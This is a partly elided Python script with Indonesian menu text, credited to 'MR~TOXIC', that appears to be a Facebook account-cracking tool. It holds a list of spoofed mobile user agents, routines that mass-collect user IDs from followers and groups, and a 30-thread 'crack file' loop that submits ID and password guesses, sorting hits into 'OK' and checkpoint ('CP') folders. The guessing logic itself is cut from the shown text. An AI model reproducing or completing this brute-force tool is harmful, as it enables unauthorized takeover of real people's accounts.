...
'Mozilla/5.0 (Linux; Android 10; SM-A415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; SM-G780G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36'
...
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J320W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/316.0.0.54.116;]'
'Radio%20Unit%20AU/3 CFNetwork/1335.0.3 Darwin/21.6.0'
'Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606X Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Safari/537.36 GNews Android/2022102432'
'Mozilla/5.0 (Linux; Android 11; moto g 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'
'Dalvik/2.1.0 (Linux; U; Android 9; Aquaris M5 Build/PQ3A.190801.002)'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_31_78) AppleWebKit/531.72.29 (KHTML, like Gecko) Chrome/55.1.6121.1858 Safari/532.02 Edge/36.06705']
ugen=[]
cokbrut=[]
...
def menu(my_name,my_id):
	...
	alvino_xy(f'KEDALUARSA : KIAMAT ')
	alvino_xy(f'AUTHOR  : MR~TOXIC ')
	print('')
...
#print('>> 2. CRACK FOLLOW ')
  #print('>> 3. CRACK GRUP ')
	print('02.CRACK FILE	')
	print('03.CEK HASIL ')
	print('00.KELUAR/HAPUS COOKIE (LEMAH AJG)   ')
...
#		error()
		...
		print('>> Sukses Logout.....Yaaa Prustasi Gak Dapet OK ')
		exit()
	else:
		print('>> Pilih Yang Bener Bisa Baca Gak lu??')
		back()
def error():
...
def result():
	...
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP....Crack Dlu Biar Ada')
			time.sleep(2)
			back()
		else:
			cih = 0
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK....Yaaaa Kasihan Gk Dapet OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def dump_massal():
	...
	try:
		...
		print('>> Masukkan Angka TOD, Malah Huruff Bisa Baca Gak Lu?? ')
		exit()
	if jum<1 or jum>100:
	...
	for userr in uid:
		try:
			...
			print('>> Sinyal Lo Eror...Majat Pohon Biar Ada Sinyal ')
			exit()
	try:
		print('')
		...
		print(f'{x}')
		print('>> Sinyal Lo Eror....Majat Pohon Biar Ada Sonyal ')
		back()
	except (KeyError,IOError):
...
def dump_pengikut():
	...
	try:
		...
		print('>> Koneksi Internet Bermasalah Mau gue Hotspot?? ')
		exit()
	except (KeyError,IOError):
...
def grup():
	...
	try:
		...
		print(balmond+m+" Koneksi Internet Terputus..Mau Gue Hotspot")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			print(f'{k}>> Pilih Yang Bener Bisa Baca Gak Lu?? {x}')
			time.sleep(3)
			back()
		...
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				...
				if 'mobile' in method:
					...
					pool.submit(crackmbasic,idf,pwv)
		print('')
	print(f'CRACK TELAH SELESAI , JANGAN LUPA BERSYUKUR,CAPEK JADI BOT CRACK')
